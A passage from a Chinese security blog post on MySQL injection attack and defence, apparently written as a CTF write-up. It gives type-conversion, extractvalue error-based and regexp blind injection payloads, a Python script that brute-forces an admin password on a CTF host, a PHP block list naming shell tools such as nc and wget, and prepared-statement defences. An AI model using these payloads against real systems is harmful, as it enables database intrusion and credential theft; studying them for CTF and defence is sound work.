+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=true</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;b&#x27;</span><span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;b&#x27;</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="literal">false</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)<span class="operator">=</span><span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+
+<p>我们还有关于此的漏洞，就以一次CTF的题目来说(源码如下)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fiter</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">sql_clean</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;not array!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="string">&quot;/ |*|#|,|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strrpos</span>(<span class="variable">$str</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%00&quot;</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ord_clean</span>(<span class="params"><span class="variable">$ord</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter</span> = <span class="string">&quot; |bash|perl|nc|java|php|&gt;|&gt;&gt;|wget|ftp|python|sh&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$filter</span>.<span class="string">&quot;/i&quot;</span>,<span class="variable">$ord</span>) == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;order = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;order = <span class="variable">$ord</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里过滤了很多关键词了，需要用到类型转换了，这里我们用+号</p>
+<p>Payload如下：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=aa<span class="string">&#x27;+(ascii(mid((passwd)from(1)))&gt;0)+&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>执行的SQL语句如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxx <span class="built_in">where</span> username = <span class="string">&#x27;aa&#x27;</span>+(ascii(mid((passwd)from(users)))&gt;0)+<span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以开始写脚本跑数据了</p>
+<p>除了＋号，其他算术操作符号也会发生类型的类型转换，例如MOD，DIV，＊，／，％，－， </p>
+<p>关于隐式类型转换的文章可以看<a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/8773.html">这里</a></p>
+<p><strong>HTTP参数污染</strong></p>
+<p>当我们传入的参数为</p>
+<p><a target="_blank" rel="noopener" href="http://sqlinjection.com/?par1=val1&par1=val2">http://sqlinjection.com/?par1=val1&amp;par1=val2</a></p>
+<p>进入到不同的Web Server就可能得到不同的结果，这里借鉴一下国外大佬一篇文章的总结，如下：</p>
+<p>![image-20250113142348871](MySQL 注入攻击与防御&#x2F;image-20250113142348871.png)</p>
+<p>不同的web server的处理结果截然不同</p>
+<p>![image-20250113142411929](MySQL 注入攻击与防御&#x2F;image-20250113142411929.png)</p>
+<p>这里也推荐一篇国外的<a target="_blank" rel="noopener" href="http://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf">文章</a></p>
+<p><strong>实战正则过滤绕过</strong></p>
+<p>![image-20250113142422398](MySQL 注入攻击与防御&#x2F;image-20250113142422398.png)</p>
+<p><strong>防御手段(代码以PHP为例)</strong></p>
+<p>像WAF之类防御手段自己无能为力经常打补丁就好，这里主要提一下代码层面的问题 </p>
+<p>推荐使用下面的方式进行查询：</p>
+<p><strong>MYSQLi</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;update name set name = ? where id = ?&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;si&#x27;</span>,<span class="variable">$name</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>
+
+<p><strong>ODBC</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="title function_ invoke__">odbc_prepare</span>( <span class="variable">$conn</span>, <span class="string">&#x27;SELECT * FROM users WHERE email = ?&#x27;</span> );</span><br><span class="line"><span class="variable">$success</span> = <span class="title function_ invoke__">odbc_execute</span>( <span class="variable">$stmt</span>, <span class="keyword">array</span>(<span class="variable">$email</span>) );</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dbh</span> = <span class="title function_ invoke__">odbc_exec</span>(<span class="variable">$conn</span>, <span class="string">&#x27;SELECT * FROM users WHERE email = ?&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$email</span>));</span><br><span class="line"><span class="variable">$sth</span> = <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE email = :email&#x27;</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>PDO</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:dbname=testdb;host=127.0.0.1&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO REGISTRY (name, value) VALUES (:name, :value)&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:value&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="comment">// insert one row</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;one&#x27;</span>;</span><br><span class="line"><span class="variable">$value</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:dbname=testdb;host=127.0.0.1&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;UPDATE people SET name = :new_name WHERE id = :id&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>( <span class="keyword">array</span>(<span class="string">&#x27;new_name&#x27;</span> =&gt; <span class="variable">$name</span>, <span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$id</span>) );</span><br></pre></td></tr></table></figure>
+
+<p><strong>框架</strong></p>
+<p>对于框架的话只要遵循框架的API就好，例如wp的查询</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> <span class="variable">$wpdb</span>;</span><br><span class="line"><span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">query</span>(</span><br><span class="line">    <span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT name FROM people WHERE id = %d OR email = %s&#x27;</span>,</span><br><span class="line">        <span class="variable">$person_id</span>, <span class="variable">$person_email</span></span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> <span class="variable">$wpdb</span>;</span><br><span class="line"><span class="variable">$wpdb</span>-&gt;<span class="title function_ invoke__">insert</span>( <span class="string">&#x27;people&#x27;</span>,</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;person_id&#x27;</span> =&gt; <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;person_email&#x27;</span> =&gt; <span class="string">&#x27;bobby@tables.com&#x27;</span></span><br><span class="line">        ),</span><br><span class="line">    <span class="keyword">array</span>( <span class="string">&#x27;%d&#x27;</span>, <span class="string">&#x27;%s&#x27;</span> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="报错注入，返回多行限制"><a href="#报错注入，返回多行限制" class="headerlink" title="报错注入，返回多行限制"></a>报错注入，返回多行限制</h2><blockquote>
+<p>适用于过滤了空格，left和right</p>
+</blockquote>
+<blockquote>
+<p>admin”||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(‘^f’))))#</p>
+</blockquote>
+<p>用regexp进行正则匹配f开头的内容所在行</p>
+<p>如果超过限制32位，可以用reverse逆向输出正则匹配所在行</p>
+<blockquote>
+<p>admin”||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(‘^f’)))))#</p>
+</blockquote>
+<h2 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h2><p>这个注入方式呢相当于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1001.2101.3001.7020">布尔盲注</a>吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后^匹配e开头的password</p>
+<p>![{BF2E734F-AC80-42F4-93E1-4C7F60DB1B8E}](MySQL 注入攻击与防御&#x2F;{BF2E734F-AC80-42F4-93E1-4C7F60DB1B8E}.png)</p>
+<p>无对应匹配结果返回空，</p>
+<p>![{F19B2D9C-C97F-4F8F-ABC5-8537DF97F426}](MySQL 注入攻击与防御&#x2F;{F19B2D9C-C97F-4F8F-ABC5-8537DF97F426}.png)</p>
+<p>分析<br>回到题目里，提示给了串SQL语句</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> <span class="attribute">passwd</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>想要猜解admin的密码需要用到admin，可是题目过滤掉了admin，但是我们能用其他方法绕过，让username&#x3D;\，将语句后面的单引号给转义掉，我们可以构造这样的payload</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=\&amp;passwd=||sql<span class="comment">;%00</span></span><br></pre></td></tr></table></figure>
+
+<p>因为题目过滤掉了空格，空格能用内联注释符&#x2F;**&#x2F;代替</p>
+<p>注释符#和–  被过滤掉了，这里用;%00截断注释后面的内容</p>
+<p>放入原查询语句相当于</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> <span class="attribute">passwd</span>=<span class="string">&#x27;||sql;%00&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>即</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">sql</span>;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p> 这时候就能利用正则进行注入了构建payload</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span><span class="operator">=</span>\<span class="variable">&amp;passwd</span>=||<span class="comment">/**/</span>passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="string">&quot;^x&quot;</span><span class="punctuation">;</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p>相当于</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="comment">/**/</span>passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span><span class="string">&quot;^x&quot;</span>;%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p>用burp进行爆破，</p>
+<p>![image-20250204133455353](MySQL 注入攻击与防御&#x2F;image-20250204133455353.png)</p>
+<p>可以发现Yy响应长度不一样，因为里面没有弹窗alert提醒标签</p>
+<p>![image-20250204133550375](MySQL 注入攻击与防御&#x2F;image-20250204133550375.png)</p>
+<p>所以得出密码第一位是Y（y）不区分大小写</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#buuctf web [NCTF2019]SQLi</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">pw_fuzz = string.ascii_lowercase + string.digits + <span class="string">&quot;_&quot;</span>      <span class="comment">#密码字典：小写字母和数字还有下划线</span></span><br><span class="line">pw = <span class="string">&quot;&quot;</span>     <span class="comment">#admin的密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pw_fuzz:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;</span>.<span class="built_in">format</span>((pw+i)) <span class="comment">#以此匹配开头，直到pw是完整flag</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;alert&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            pw = pw + i</span><br><span class="line">            <span class="built_in">print</span>(pw)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mysql-字符串运算"><a href="#Mysql-字符串运算" class="headerlink" title="Mysql 字符串运算"></a>Mysql 字符串运算</h2><p> mysql的字符串运算</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;1&#x27; + &#x27;2&#x27;</span><br><span class="line"># 3</span><br><span class="line">select &#x27;1&#x27;+database()+&#x27;0&#x27;;</span><br><span class="line">#1</span><br><span class="line">select &#x27;0&#x27;+hex(database())+&#x27;0&#x27;;</span><br><span class="line">#776562 -&gt; web的16进制</span><br><span class="line">select &#x27;0&#x27;+ascii(substr(database(),1,1))+&#x27;0&#x27;;</span><br><span class="line">#119 -&gt; w的ascii码</span><br><span class="line">select &#x27;0&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0&#x27;;</span><br><span class="line">##119 -&gt; w的ascii码</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+      
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" rel="prev" title="正则绕过总结">
+      <i class="fa fa-chevron-left"></i> 正则绕过总结
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">1.</span> <span class="nav-text">MySQL 注入攻击与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%8C%E8%BF%94%E5%9B%9E%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6"><span class="nav-number">1.1.</span> <span class="nav-text">报错注入，返回多行限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">正则注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97"><span class="nav-number">1.3.</span> <span class="nav-text">Mysql 字符串运算</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ttoc"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Ttoc</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ttoc</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
